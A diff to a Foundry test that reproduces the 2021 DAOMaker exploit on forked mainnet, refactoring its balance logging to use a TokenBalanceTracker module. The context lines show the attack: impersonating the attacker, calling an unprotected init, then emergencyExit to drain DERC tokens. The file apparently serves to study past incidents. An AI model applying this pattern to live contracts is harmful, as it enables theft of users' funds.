@@ -5,6 +5,8 @@ import "forge-std/Test.sol";
 import {TestHarness} from "../TestHarness.sol";
 import {IERC20} from '../interfaces/IERC20.sol';
 
+import {TokenBalanceTracker} from '../modules/TokenBalanceTracker.sol';
+
 // forge test --match-contract Exploit_DAOMaker -vvv
 /*
 On Sept 03, 2021 an attacker stole over 4MM USD in various tokens from an DAOMaker.
@@ -42,18 +44,21 @@ interface DAOMaker {
     function emergencyExit(address receiver) external;
 }
 
-contract Exploit_DAOMaker is TestHarness {
+contract Exploit_DAOMaker is TestHarness, TokenBalanceTracker {
     address internal attacker = 0x2708CACE7b42302aF26F1AB896111d87FAEFf92f;
     DAOMaker internal daomaker = DAOMaker(0x2FD602Ed1F8cb6DEaBA9BEDd560ffE772eb85940);
+
     IERC20 internal derc = IERC20(0x9fa69536d1cda4A04cFB50688294de75B505a9aE);
 
     function setUp() external {
         cheat.createSelectFork('mainnet', 13155349);
+
+        addTokenToTracker(address(derc));
     }
 
     function test_attack() external {
         console.log('------- STEP 0: INITIAL BALANCE -------');
-        emit log_named_decimal_uint('Attacker DERC', derc.balanceOf(attacker), derc.decimals());
+        logBalances(attacker);
         console.log('\n');
 
         console.log('------- STEP 1: INITIALIZATION -------');
@@ -71,7 +76,7 @@ contract Exploit_DAOMaker is TestHarness {
         daomaker.init(start, releasePeriods, releasePercents, address(derc));
        
         console.log('Current Block:', initBlock);
-        emit log_named_decimal_uint('Attacker DERC', derc.balanceOf(attacker), derc.decimals());
+        logBalances(attacker);
         console.log('\n');
         
         console.log('------- STEP 2: DERC EXIT -------');
@@ -81,7 +86,7 @@ contract Exploit_DAOMaker is TestHarness {
         cheat.prank(attacker);
         daomaker.emergencyExit(attacker);
 
-        emit log_named_decimal_uint('Attacker DERC', derc.balanceOf(attacker), derc.decimals());
+        logBalances(attacker);
 
     }
 
